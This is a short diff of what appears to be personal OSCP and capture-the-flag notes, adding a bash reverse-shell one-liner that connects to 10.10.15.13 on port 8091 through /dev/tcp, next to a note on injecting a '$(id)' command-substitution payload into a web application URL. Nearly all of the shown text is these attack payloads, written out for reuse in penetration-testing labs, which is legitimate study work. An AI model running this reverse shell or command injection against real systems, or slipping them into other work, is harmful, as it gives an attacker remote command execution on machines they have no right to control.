@@ -2,8 +2,12 @@
 
 # OSCP / CTF
 
-TRy to insert VAR into webapp
+BASH SH REVERSE SHELL
+```
+bash -i >& /dev/tcp/10.10.15.13/8091 0>&1
+```
 
+TRy to insert VAR into webapp
 ```
 http://myip:8081/$(id)
 
